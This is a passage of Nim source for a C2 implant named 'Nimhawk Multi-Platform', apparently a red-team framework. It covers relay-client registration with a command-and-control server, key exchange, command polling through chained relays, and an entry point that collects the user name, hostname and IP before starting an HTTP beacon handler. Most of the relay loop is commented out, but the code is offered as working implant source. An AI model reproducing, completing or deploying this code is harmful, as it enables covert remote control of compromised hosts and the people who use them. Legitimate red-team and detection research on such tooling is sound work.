                            # Check if this is a new registration or re-registration
                            if regResponse.hasKey("key"):
                                # NEW REGISTRATION: Has encryption key
                                let encryptionKey = regResponse["key"].getStr()
                                
                                # Extract parent GUID if provided
                                if regResponse.hasKey("parent_guid"):
                                    let parentGuid = regResponse["parent_guid"].getStr()
                                    setParentRelayServerGuid(parentGuid)
                                    when defined debug:
                                        echo "[DEBUG] 🔗 NEW REGISTRATION: Received parent GUID: " & parentGuid
                                
                                when defined debug:
                                    echo "[DEBUG] 🆕 ┌─────────── NEW REGISTRATION PATH ───────────┐"
                                    echo "[DEBUG] 🆕 │ Response HAS 'key' field - NEW registration │"
                                    echo "[DEBUG] 🆕 │ Encryption key length: " & $encryptionKey.len & " │"
                                    echo "[DEBUG] 🆕 └─────────────────────────────────────────────┘"
                                    echo "[DEBUG] 🚨 CLIENT ID VALIDATION: NEW REGISTRATION - ID ASSIGNMENT!"
                                    echo "[DEBUG] 🚨 CLIENT ID VALIDATION: OLD ID: '" & g_relayClientID & "'"
                                    echo "[DEBUG] 🚨 CLIENT ID VALIDATION: NEW ID: '" & assignedId & "'"
                                    
                                    # CRITICAL: Check if this is actually a DIFFERENT ID
                                    if g_relayClientID != "" and g_relayClientID != "PENDING-REGISTRATION" and g_relayClientID != assignedId:
                                        echo "[DEBUG] 🚨🚨🚨 IDENTITY THEFT ALERT! 🚨🚨🚨"
                                        echo "[DEBUG] 🚨 CLIENT HAD ID: '" & g_relayClientID & "'"
                                        echo "[DEBUG] 🚨 C2 ASSIGNED ID: '" & assignedId & "'"
                                        echo "[DEBUG] 🚨 THIS IS THE BUG! C2 REUSED ANOTHER CLIENT'S ID!"
                                        echo "[DEBUG] 🚨🚨🚨 IDENTITY THEFT ALERT! 🚨🚨🚨"
                                
                                g_relayClientID = assignedId
                                g_relayClientKey = encryptionKey
                                storeImplantID(assignedId)
                                
                                when defined debug:
                                    echo "[DEBUG] 🆔 ┌─────────── NEW ID & KEY ASSIGNMENT ───────────┐"
                                    echo "[DEBUG] 🆔 │ ✅ NEW ID and encryption key assigned by C2 │"
                                    echo "[DEBUG] 🆔 │ New ID: " & assignedId & " │"
                                    echo "[DEBUG] 🔑 │ Key length: " & $encryptionKey.len & " │"
                                    echo "[DEBUG] 🆔 └─────────────────────────────────────────────────┘"
                                
                                # 🚀 CONFIRMATION PROTOCOL: Send confirmation to relay server
                                let parentGuid = getParentRelayServerGuid()
                                let confirmationRoute = @[assignedId, parentGuid]
                                let confirmationMsg = relay_protocol.createConfirmationMessage(
                                    assignedId, confirmationRoute, parentGuid, "PENDING-REGISTRATION"
                                )
                                
                                when defined debug:
                                    echo "[DEBUG] 🔗 ┌─────────── SENDING CONFIRMATION ───────────┐"
                                    echo "[DEBUG] 🔗 │ ✅ Sending ID confirmation to relay server │"
                                    echo "[DEBUG] 🔗 │ New ID: " & assignedId & " │"
                                    echo "[DEBUG] 🔗 │ Parent GUID: " & parentGuid & " │"
                                    echo "[DEBUG] 🔗 │ Route: " & $confirmationRoute & " │"
                                    echo "[DEBUG] 🔗 └─────────────────────────────────────────────┘"
                                
                                # Send confirmation message to relay server
                                let confirmationSent = relay_comm.sendMessage(upstreamRelay, confirmationMsg)
                                
                                if confirmationSent:
                                    when defined debug:
                                        echo "[DEBUG] 🔗 ✅ CONFIRMATION sent to relay server"
                                        echo "[DEBUG] 🔗 ⏳ Waiting for CONFIRMATION_ACK..."
                                    
                                    # Set flag to wait for CONFIRMATION_ACK
                                    g_waitingForConfirmationAck = true
                                    g_confirmationAckTimeout = epochTime().int64 + 5  # 5 second timeout
                                else:
                                    when defined debug:
                                        echo "[DEBUG] 🔗 ❌ CONFIRMATION failed to send"
                            elif regResponse.hasKey("status") and regResponse["status"].getStr() == "reconnected":
                                # RE-REGISTRATION: Confirmed existing ID, but need to recover encryption key if lost
                                
                                # Extract parent GUID if provided  
                                if regResponse.hasKey("parent_guid"):
                                    let parentGuid = regResponse["parent_guid"].getStr()
                                    setParentRelayServerGuid(parentGuid)
                                    when defined debug:
                                        echo "[DEBUG] 🔗 RE-REGISTRATION: Received parent GUID: " & parentGuid
                                
                                when defined debug:
                                    echo "[DEBUG] 🔄 ┌─────────── RE-REGISTRATION PATH ───────────┐"
                                    echo "[DEBUG] 🔄 │ Response HAS 'status: reconnected' - RE-registration │"
                                    echo "[DEBUG] 🔄 │ This means client should ALREADY have encryption key │"
                                    echo "[DEBUG] 🔄 │ Current g_relayClientKey length: " & $g_relayClientKey.len & " │"
                                    echo "[DEBUG] 🔄 │ Current g_relayClientKey empty: " & $(g_relayClientKey == "") & " │"
                                    if g_relayClientKey == "":
                                        echo "[DEBUG] 🚨 │ 🚨 BUG: RE-REGISTRATION but no existing key! │"
                                        echo "[DEBUG] 🚨 │ 🚨 This should never happen - key was lost! │"
                                        echo "[DEBUG] 🔧 │ 🔧 WILL ATTEMPT TO RECOVER KEY FROM C2 │"
                                    echo "[DEBUG] 🔄 └─────────────────────────────────────────────┘"
                                    echo "[DEBUG] 🔄 CLIENT ID VALIDATION: RE-REGISTRATION CONFIRMED"
                                    echo "[DEBUG] 🔄 CLIENT ID VALIDATION: Confirmed ID: '" & assignedId & "'"
                                    echo "[DEBUG] 🔄 CLIENT ID VALIDATION: Should match current: '" & g_relayClientID & "'"
                                    
                                    # CRITICAL: Validate the confirmed ID matches what client expects
                                    if g_relayClientID != assignedId:
                                        echo "[DEBUG] 🚨🚨🚨 RE-REGISTRATION ID MISMATCH! 🚨🚨🚨"
                                        echo "[DEBUG] 🚨 CLIENT EXPECTED: '" & g_relayClientID & "'"
                                        echo "[DEBUG] 🚨 SERVER CONFIRMED: '" & assignedId & "'"
                                        echo "[DEBUG] 🚨 THIS IS ALSO A BUG! SERVER CONFUSED ABOUT CLIENT ID!"
                                        echo "[DEBUG] 🚨🚨🚨 RE-REGISTRATION ID MISMATCH! 🚨🚨🚨"
                                        # IGNORE mismatched re-registration responses
                                        continue
                                
                                g_relayClientID = assignedId
                                
                                # CRITICAL FIX: If encryption key is lost, force re-registration
                                if g_relayClientKey == "":
                                    when defined debug:
                                        echo "[DEBUG] 🔧 ┌─────────── ENCRYPTION KEY RECOVERY ───────────┐"
                                        echo "[DEBUG] 🔧 │ Encryption key lost during restart │"
                                        echo "[DEBUG] 🔧 │ Relay client needs re-registration │"
                                        echo "[DEBUG] 🔧 │ Will force disconnect and re-register │"
                                        echo "[DEBUG] 🔧 └─────────────────────────────────────────────────┘"
                                    
                                    # Force reconnection to trigger fresh registration
                                    upstreamRelay.isConnected = false
                                    g_relayClientID = ""  # Clear ID to force fresh registration
                                    
                                    when defined debug:
                                        echo "[DEBUG] 🔧 ✅ Forced disconnect - will re-register in next cycle"
                                    
                                    # Skip this cycle and reconnect
                                    continue
                                else:
                                    when defined debug:
                                        echo "[DEBUG] 🔄 ✅ Encryption key already exists, no recovery needed"
                                
                                # ID should already be stored, but confirm it
                                storeImplantID(assignedId)
                                
                                when defined debug:
                                    echo "[DEBUG] 🔄 ┌─────────── RE-REGISTRATION CONFIRMED ───────────┐"
                                    echo "[DEBUG] 🔄 │ ✅ Existing ID confirmed by relay server │"
                                    echo "[DEBUG] 🔄 │ ID: " & assignedId & " (PRESERVED) │"
                                    let keyStatus = if g_relayClientKey != "": "AVAILABLE" else: "MISSING"
                                    echo "[DEBUG] 🔑 │ Encryption key: " & keyStatus & " │"
                                    echo "[DEBUG] 🔄 │ 🎉 Successfully reconnected with existing ID! │"
                                    echo "[DEBUG] 🔄 └─────────────────────────────────────────────────┘"
                            else:
                                # Unknown format
                                when defined debug:
                                    echo "[DEBUG] ⚠️  ┌─────────── UNKNOWN RESPONSE FORMAT ───────────┐"
                                    echo "[DEBUG] ⚠️  │ Response does NOT have 'key' field │"
                                    echo "[DEBUG] ⚠️  │ Response does NOT have 'status: reconnected' │"
                                    echo "[DEBUG] ⚠️  │ This is an unexpected response format! │"
                                    echo "[DEBUG] ⚠️  │ Full response JSON: " & $regResponse & " │"
                                    echo "[DEBUG] ⚠️  └─────────────────────────────────────────────────┘"
                                    echo "[DEBUG] ⚠️  CLIENT ID VALIDATION: Unknown registration response format"
                                    echo "[DEBUG] ⚠️  CLIENT ID VALIDATION: Full response: " & $regResponse
                        except:
                            # Fallback to old format (plain ID) - WITH VALIDATION
                            when defined debug:
                                echo "[DEBUG] 🔍 FALLBACK: JSON parsing failed, trying old format"
                                echo "[DEBUG] 🔍 FALLBACK: responsePayload = '" & responsePayload & "'"
                                echo "[DEBUG] 🔍 FALLBACK: Current g_relayClientID = '" & g_relayClientID & "'"
                            
                            # CRITICAL FIX: Apply same validation for old format
                            if g_relayClientID != "" and g_relayClientID != "PENDING-REGISTRATION" and g_relayClientID != responsePayload:
                                when defined debug:
                                    echo "[DEBUG] 🚨 FALLBACK CONTAMINATION DETECTED!"
                                    echo "[DEBUG] 🚨 This client ID: '" & g_relayClientID & "'"
                                    echo "[DEBUG] 🚨 Response for ID: '" & responsePayload & "'"
                                    echo "[DEBUG] 🚨 IGNORING old format response meant for another client!"
                                # IGNORE responses not meant for this client
                                continue
                            
                            g_relayClientID = responsePayload
                            storeImplantID(responsePayload)
                            when defined debug:
                                echo "[DEBUG] 🆔 ┌─────────── ID ASSIGNMENT (OLD FORMAT) ───────────┐"
                                echo "[DEBUG] 🆔 │ ✅ ID assigned by C2 and stored │"
                                echo "[DEBUG] 🆔 │ New ID: " & responsePayload & " │"
                                echo "[DEBUG] ⚠️  │ No encryption key received (old format) │"
                                echo "[DEBUG] 🆔 └─────────────────────────────────────────────────┘"
                    else:
                        when defined debug:
                            echo "[DEBUG] ℹ️  ┌─────────── OTHER RESPONSE ───────────┐"
                            echo "[DEBUG] ℹ️  │ Other HTTP response: " & responsePayload & " │"
                            echo "[DEBUG] ℹ️  └─────────────────────────────────────────┘"
                
                of FORWARD:
                    # Forwarded message from another implant
                    when defined debug:
                        echo "[DEBUG] 🔗 Relay Client: Received forwarded message"
                
                of CONFIRMATION_ACK:
                    # Confirmation acknowledgment from relay server
                    let ackPayload = relay_protocol.smartDecrypt(msg.payload)
                    
                    when defined debug:
                        echo "[DEBUG] 🔗 ┌─────────── CONFIRMATION_ACK RECEIVED ───────────┐"
                        echo "[DEBUG] 🔗 │ ✅ CONFIRMATION_ACK from relay server │"
                        echo "[DEBUG] 🔗 │ Response: " & ackPayload & " │"
                        echo "[DEBUG] 🔗 └─────────────────────────────────────────────────┘"
                    
                    try:
                        let ackData = parseJson(ackPayload)
                        let status = ackData["status"].getStr()
                        let clientId = ackData["client_id"].getStr()
                        
                        if status == "SUCCESS" and clientId == g_relayClientID:
                            when defined debug:
                                echo "[DEBUG] 🔗 ✅ Registry update confirmed by relay server"
                                echo "[DEBUG] 🔗 ✅ Client ID '" & clientId & "' is now active in relay server registry"
                                echo "[DEBUG] 🔗 ✅ Confirmation protocol completed successfully!"
                            
                            # Clear waiting flag
                            g_waitingForConfirmationAck = false
                            g_confirmationAckTimeout = 0
                        else:
                            when defined debug:
                                echo "[DEBUG] 🔗 ❌ Registry update failed or wrong client ID"
                                echo "[DEBUG] 🔗 ❌ Status: " & status & ", Expected client: " & g_relayClientID & ", Got: " & clientId
                        
                    except Exception as e:
                        when defined debug:
                            echo "[DEBUG] 🔗 ❌ Error parsing CONFIRMATION_ACK: " & e.msg

                
                else:
                    when defined debug:
                        echo "[DEBUG] 🔗 Relay Client: ℹ️  Ignoring message type: " & $msg.msgType
            
            # CONFIRMATION ACK TIMEOUT: Check if we're waiting too long for confirmation
            if g_waitingForConfirmationAck and epochTime().int64 > g_confirmationAckTimeout:
                when defined debug:
                    echo "[DEBUG] 🔗 ⏰ CONFIRMATION_ACK timeout reached"
                    echo "[DEBUG] 🔗 ⚠️ Proceeding without confirmation (relay server may not support new protocol)"
                
                # Clear waiting flag and continue
                g_waitingForConfirmationAck = false
                g_confirmationAckTimeout = 0
            
            # NO MORE ARBITRARY TIMEOUTS! 
            # Only disconnect on REAL socket errors, not on time-based assumptions
            # An implant can go days/weeks without commands - this is NORMAL behavior
            
            # Send PULL message to request commands from relay server
            when defined debug:
                echo "[DEBUG] 📡 ┌─────────── SENDING PULL REQUEST ───────────┐"
                echo "[DEBUG] 📡 │ Sending PULL request for commands... │"
                echo "[DEBUG] 📡 │ Client ID: " & g_relayClientID & " │"
                echo "[DEBUG] 📡 │ Route: [" & g_relayClientID & ", " & g_parentRelayServerGuid & "] │"
                echo "[DEBUG] 🔑 │ Encrypting key with INITIAL_XOR_KEY │"
                echo "[DEBUG] 🌐 │ Network RTT: " & $g_networkHealth.rtt.int & "ms, Multiplier: " & $g_networkHealth.adaptiveMultiplier & " │"
                echo "[DEBUG] 📡 └─────────────────────────────────────────────┘"
            
            # Record start time for network latency measurement
            let pullStartTime = epochTime()
            
            # SOCKET HEALTH BEFORE SEND: Critical diagnostic point
            when defined debug:
                try:
                    let preSendFd = upstreamRelay.socket.getFd()
                    if preSendFd == osInvalidSocket:
                        echo "[DEBUG] 🚨 ┌─────────── PRE-SEND SOCKET CORRUPTION ───────────┐"
                        echo "[DEBUG] 🚨 │ Socket FD corrupted BEFORE sending PULL │"
                        echo "[DEBUG] 🚨 │ This will definitely cause send to fail │"
                        echo "[DEBUG] 🚨 └─────────────────────────────────────────────────┘"
                        upstreamRelay.isConnected = false
                        await sleepAsync(ERROR_RECOVERY_SLEEP)
                        continue
                    else:
                        echo "[DEBUG] 🔍 Pre-send socket health - FD: " & $int(preSendFd) & " (sending PULL now...)"
                except Exception as preSendError:
                    echo "[DEBUG] 🚨 Pre-send socket check failed: " & preSendError.msg
                    upstreamRelay.isConnected = false
                    await sleepAsync(ERROR_RECOVERY_SLEEP)
                    continue
            
            # Encrypt the relay client's encryption key for secure transmission
            let encryptedKey = xorString(g_relayClientKey, INITIAL_XOR_KEY)
            
            when defined debug:
                echo "[DEBUG] 🔑 ┌─────────── PULL KEY DEBUG ───────────┐"
                echo "[DEBUG] 🔑 │ g_relayClientKey length: " & $g_relayClientKey.len & " │"
                echo "[DEBUG] 🔑 │ g_relayClientKey empty: " & $(g_relayClientKey == "") & " │"
                echo "[DEBUG] 🔑 │ encryptedKey length: " & $encryptedKey.len & " │"
                echo "[DEBUG] 🔑 │ INITIAL_XOR_KEY: " & $INITIAL_XOR_KEY & " │"
                if g_relayClientKey == "":
                    echo "[DEBUG] 🚨 │ CRITICAL: g_relayClientKey is EMPTY! │"
                    echo "[DEBUG] 🚨 │ This will cause C2 check-in to fail! │"
                    echo "[DEBUG] 🚨 │ Client never received encryption key! │"
                else:
                    echo "[DEBUG] 🔑 │ g_relayClientKey preview: " & g_relayClientKey[0..min(7, g_relayClientKey.len-1)] & "... │"
                echo "[DEBUG] 🔑 └─────────────────────────────────────────┘"
            
            # Create pull payload with client's UNIQUE_KEY embedded (for relay server extraction)
            let pullPayload = %*{
                "action": "poll_commands",
                "key": encryptedKey,
                "client_unique_key": g_relayClientKey  # ✅ Include client's UNIQUE_KEY for relay server
            }
            
            # CRITICAL FIX: Use SHARED KEY for hop-to-hop communication with relay server
            # The relay server will re-encrypt with UNIQUE KEY before forwarding to C2
            let useUniqueKey = false  # Always use SHARED KEY for relay server communication
            
            when defined debug:
                echo "[DEBUG] 🔑 PULL Message Key Decision:"
                echo "[DEBUG] 🔑 - Messages to relay server use SHARED KEY (hop-to-hop)"
                echo "[DEBUG] 🔑 - Relay server will re-encrypt with UNIQUE KEY for C2"
                echo "[DEBUG] 🔑 - Using SHARED key for relay communication"
            
            let pullMsg = createMessage(PULL,
                g_relayClientID,
                @[g_relayClientID, g_parentRelayServerGuid],
                $pullPayload,
                useUniqueKey  # ✅ Use SHARED KEY for relay server
            )
            
            let pullSuccess = sendMessage(upstreamRelay, pullMsg)
            
            # CRITICAL: Track if we're receiving responses to detect dead connections
            if pullSuccess:
                # Update network health based on PULL success/failure
                updateNetworkHealth(pullStartTime, pullSuccess)
                
                when defined debug:
                    echo "[DEBUG] ✅ ┌─────────── PULL SENT ───────────┐"
                    echo "[DEBUG] ✅ │ PULL request sent successfully │"
                    echo "[DEBUG] ✅ │ Waiting for relay server... │"
                    echo "[DEBUG] ✅ └─────────────────────────────────┘"
                
            else:
                # Send failed - connection is definitely dead
                updateNetworkHealth(pullStartTime, false)
                
                # POST-SEND SOCKET DIAGNOSTICS: Check what happened to socket after send failed
                when defined debug:
                    echo "[DEBUG] ❌ ┌─────────── PULL FAILED ───────────┐"
                    echo "[DEBUG] ❌ │ Failed to send PULL request │"
                    
                    try:
                        let postSendFd = upstreamRelay.socket.getFd()
                        if postSendFd == osInvalidSocket:
                            echo "[DEBUG] ❌ │ Socket FD corrupted DURING send! │"
                            echo "[DEBUG] ❌ │ Send operation corrupted the socket │"
                        else:
                            echo "[DEBUG] ❌ │ Socket FD still valid: " & $int(postSendFd) & " │"
                            echo "[DEBUG] ❌ │ Send failed for other reason │"
                    except Exception as postSendError:
                        echo "[DEBUG] ❌ │ Cannot check post-send FD: " & postSendError.msg & " │"
                    
                    echo "[DEBUG] ❌ │ Connection marked as dead │"
                    echo "[DEBUG] ❌ └─────────────────────────────────┘"
                
                # Force disconnect
                upstreamRelay.isConnected = false
            
            # CRITICAL FIX: CHAIN INFO REPORTING for Relay Clients
            # This was missing and is why relay clients never appear in topology
            try:
                when defined debug:
                    echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: Debug vars - connected=" & $upstreamRelay.isConnected & ", clientID='" & g_relayClientID & "', parentGUID='" & g_parentRelayServerGuid & "'"
                
                if upstreamRelay.isConnected and g_relayClientID != "" and g_relayClientID != "PENDING-REGISTRATION":
                    # CHANGED: Send more frequently for testing - every 3 cycles instead of 10
                    if loopCount mod 3 == 1:
                        # FIXED: Determine role correctly for CHAINED RELAY SERVER
                        var myRole = "RELAY_CLIENT"
                        var listeningPort = 0
                        
                        # Check if we're also functioning as a relay server (CHAINED RELAY SERVER)
                        if g_relayServer.isListening:
                            myRole = "RELAY_SERVER"
                            listeningPort = g_relayServer.port
                        
                        let parentGuid = g_parentRelayServerGuid
                        
                        when defined debug:
                            echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ✅ SENDING chain info - Cycle #" & $loopCount
                            echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: Role=" & myRole & ", Parent='" & parentGuid & "', Port=" & $listeningPort
                            echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: Client ID='" & g_relayClientID & "'"
                        
                        # ADDITIONAL DEBUG: Show if parent GUID is empty
                        if parentGuid == "":
                            when defined debug:
                                echo "[DEBUG] 🚨 RELAY CLIENT CHAIN INFO: ⚠️  WARNING - Parent GUID is EMPTY!"
                                echo "[DEBUG] 🚨 RELAY CLIENT CHAIN INFO: This might cause topology issues"
                        
                        # Create chain info with encryption key (same as PULL messages)
                        let encryptedKey = xorString(g_relayClientKey, INITIAL_XOR_KEY)
                        
                        let chainData = %*{
                            "implantID": g_relayClientID,
                            "parentGuid": parentGuid,
                            "role": myRole,
                            "listeningPort": listeningPort,
                            "key": encryptedKey,  # Include encryption key like PULL messages
                            "timestamp": epochTime().int64
                        }
                        
                        # ENHANCED: Use createChainInfoMessage with double encryption for consistency
                        let chainMsg = relay_protocol.createChainInfoMessage(
                            g_relayClientID,
                            @[g_relayClientID, g_parentRelayServerGuid],
                            parentGuid,
                            myRole,
                            listeningPort,
                            g_relayClientKey  # DOUBLE ENCRYPTION: Use client's UNIQUE_KEY
                        )
                        
                        when defined debug:
                            echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: Created CHAIN_INFO message, attempting to send..."
                        
                        let chainSuccess = relay_comm.sendMessage(upstreamRelay, chainMsg)
                        
                        when defined debug:
                            if chainSuccess:
                                echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ✅ Chain info sent via RELAY SERVER"
                                echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ✅ This should be forwarded to C2 and appear in topology!"
                            else:
                                echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ❌ Failed to send chain info via relay server"
                                echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ❌ Connection might be broken"
                    else:
                        when defined debug:
                            echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: Skipping cycle " & $loopCount & " (sends every 3rd)"
                else:
                    when defined debug:
                        echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ❌ Preconditions not met:"
                        if not upstreamRelay.isConnected:
                            echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: - Not connected to relay server"
                        if g_relayClientID == "" or g_relayClientID == "PENDING-REGISTRATION":
                            echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: - Client not registered yet (ID: '" & g_relayClientID & "')"
            except Exception as chainError:
                when defined debug:
                    echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ❌ Exception: " & chainError.msg
                    echo "[DEBUG] 🔗 RELAY CLIENT CHAIN INFO: ❌ Exception type: " & $chainError.name
            
            # Use adaptive polling interval based on network conditions
            let adaptiveInterval = getAdaptivePollingInterval()
            
            when defined debug:
                echo ""
                echo "[DEBUG] 🌐 Adaptive sleep: " & $adaptiveInterval & "ms (base: " & 
                     (if CLIENT_FAST_MODE: "1000ms" else: "2000ms") & ", RTT: " & $g_networkHealth.rtt.int & "ms)"
                echo ""
                echo "┌─ 🔗 END RELAY CLIENT CYCLE #" & $loopCount
                echo "├─ 💤 Sleeping for " & $adaptiveInterval & "ms..."
                echo "└─────────────────────────────────────────────────────────"
                echo ""
                echo ""
                echo ""
            
            await sleepAsync(adaptiveInterval)
            
            # SAFE RECONNECTION: Check if connection is still alive and handle stuck connections
            if not upstreamRelay.isConnected:
                # Check if we can attempt reconnection (backoff protection)
                if canAttemptReconnection():
                    recordReconnectionAttempt()
                    let reconnectDelay = getReconnectionDelay()
                    
                    when defined debug:
                        echo "[DEBUG] 🔄 Connection lost, attempting safe reconnection..."
                        echo "[DEBUG] 🔄 Backoff delay: " & $reconnectDelay & "ms"
                    
                    await sleepAsync(reconnectDelay)
                    let reconnectResult = connectToUpstreamRelay(host, port)
                    
                    when defined debug:
                        echo "[DEBUG] 🔄 Reconnection result: " & reconnectResult
                    
                    # Reset manager if successful
                    if upstreamRelay.isConnected:
                        resetReconnectionManager()
                        when defined debug:
                            echo "[DEBUG] ✅ Reconnection successful, backoff reset"
                else:
                    when defined debug:
                        echo "[DEBUG] 🚨 Reconnection attempts exceeded, entering long cooldown"
                    await sleepAsync(60000)  # 1 minute cooldown when max attempts reached
            
        except Exception as e:
            when defined debug:
                echo "[DEBUG] Relay client error: " & e.msg
            await sleepAsync(ERROR_RECOVERY_SLEEP) # Optimized error recovery sleep
]#

# HTTP Relay System: Legacy safe wrappers also commented out
#[
# Safe async wrappers to prevent event loop crashes - FIXED ASYNC RECURSION CASCADE
var g_relayClientRunning = false
var g_httpHandlerRunning = false

proc safeRelayClientHandler(host: string, port: int) {.async.} =
    if g_relayClientRunning:
        when defined debug:
            echo "[SAFETY] 🛡️  Relay client already running, ignoring duplicate start"
        return
    
    g_relayClientRunning = true
    try:
        await relayClientHandler(host, port)
    except Exception as e:
        when defined debug:
            echo "[CRITICAL] 🚨 Relay client handler crashed: " & e.msg
            echo "[CRITICAL] 🚨 Stack trace: " & e.getStackTrace()
        # Attempt recovery after delay - NO RECURSION
        await sleepAsync(5000)  # 5 second recovery delay
        when defined debug:
            echo "[RECOVERY] 🔄 Relay client will restart in main loop - NO RECURSION"
    finally:
        g_relayClientRunning = false
        when defined debug:
            echo "[CLEANUP] 🧹 Relay client handler stopped, flag reset"

proc safeHttpHandler() {.async.} =
    if g_httpHandlerRunning:
        when defined debug:
            echo "[SAFETY] 🛡️  HTTP handler already running, ignoring duplicate start"
        return
    
    g_httpHandlerRunning = true
    try:
        await httpHandler()
    except Exception as e:
        when defined debug:
            echo "[CRITICAL] 🚨 HTTP handler crashed: " & e.msg
            echo "[CRITICAL] 🚨 Stack trace: " & e.getStackTrace()
        # Attempt recovery after delay - NO RECURSION
        await sleepAsync(5000)  # 5 second recovery delay
        when defined debug:
            echo "[RECOVERY] 🔄 HTTP handler will restart in main loop - NO RECURSION"
    finally:
        g_httpHandlerRunning = false
        when defined debug:
            echo "[CLEANUP] 🧹 HTTP handler stopped, flag reset"
]#

# Main execution function
proc runMultiImplant*() {.async.} =
    echo "=== Nimhawk Multi-Platform v1.5.0 - Dynamic Relay System ==="
    
    when defined debug:
        echo "[DEBUG] Debug mode enabled"
        echo "[DEBUG] PID: " & $getCurrentPID()
        echo "[DEBUG] Process: " & getCurrentProcessName()
        echo "[DEBUG] OS: " & getOSInfo()
        echo "[DEBUG] User: " & getUsername()
        echo "[DEBUG] Hostname: " & getSysHostname()
        echo "[DEBUG] Local IP: " & getLocalIP()
        echo "[DEBUG] HTTP Relay Build Examples:"
        echo "[DEBUG]   make darwin_arm64 RELAY_CHAIN=relay1:8080,c2:5000 DEBUG=1"
        echo "[DEBUG]   make darwin_arm64 RELAY_PORT=8080 DEBUG=1"
        echo "[DEBUG]   make darwin_arm64 RELAY_CHAIN=relay2:8080,c2:5000 RELAY_PORT=8080 DEBUG=1"
        echo "[DEBUG] "
        echo "[DEBUG] Current client mode: " & (if CLIENT_FAST_MODE: "FAST_MODE" else: "NORMAL")
        echo "[DEBUG] Server adaptive mode: " & (if g_serverFastMode: "FAST (1s)" else: "NORMAL (2s)")
    
    # NEW HTTP Relay System: Uses RELAY_CHAIN for routing
    # All relay functionality is now compile-time configured via RELAY_CHAIN and RELAY_PORT
        when defined debug:
            echo "[DEBUG] No relay address specified - continuing with STANDARD HTTP mode"
        
        # Start HTTP handler only - relay server starts inside httpHandler after registration
        when defined debug:
            echo "[DEBUG] 🚀 Starting HTTP Handler (relay server on-demand only)"
            echo "[DEBUG] ✅ Starting async event loop"
            echo "[DEBUG] 🚀 Starting HTTP Handler..."
            echo "[DEBUG] ℹ️  Relay server will start when 'relay port' command is executed"
            echo "[DEBUG] ✅ Starting HTTP handler with safe restart"
            echo "[DEBUG] 🔄 Running main loop..."
        
        # HTTP Relay System: Direct HTTP handler (no safe wrapper needed)
        when defined debug:
            echo "[MAIN] 🚀 Starting HTTP handler"
        
        await httpHandler()

# Entry point
when isMainModule:
    when defined debug:
        echo "=== Nimhawk Multi-Platform v1.5.0 - Dynamic Relay System ==="
        echo "[DEBUG] Debug mode enabled"
        echo "[DEBUG] PID: " & $getCurrentProcessId()
        echo "[DEBUG] Process: " & getAppFilename().extractFilename()
        echo "[DEBUG] OS: " & hostOS & " " & hostCPU
        echo "[DEBUG] User: " & getEnv("USER", "unknown")
        echo "[DEBUG] Hostname: " & getEnv("HOSTNAME", getEnv("COMPUTERNAME", "unknown"))
        echo "[DEBUG] Local IP: " & getLocalIP()
        echo "[DEBUG] HTTP Relay Build Examples:"
        echo "[DEBUG]   make darwin_arm64 RELAY_CHAIN=relay1:8080,c2:5000 DEBUG=1"
        echo "[DEBUG]   make darwin_arm64 RELAY_PORT=8080 DEBUG=1"
        echo "[DEBUG]   make darwin_arm64 RELAY_CHAIN=relay2:8080,c2:5000 RELAY_PORT=8080 DEBUG=1"
        echo "[DEBUG] "
        echo "[DEBUG] Current client mode: " & (if CLIENT_FAST_MODE: "FAST_MODE" else: "NORMAL")
        echo "[DEBUG] Server adaptive mode: " & (if g_serverFastMode: "FAST (1s)" else: "NORMAL (2s)")
    
    randomize()
    waitFor runMultiImplant() 
    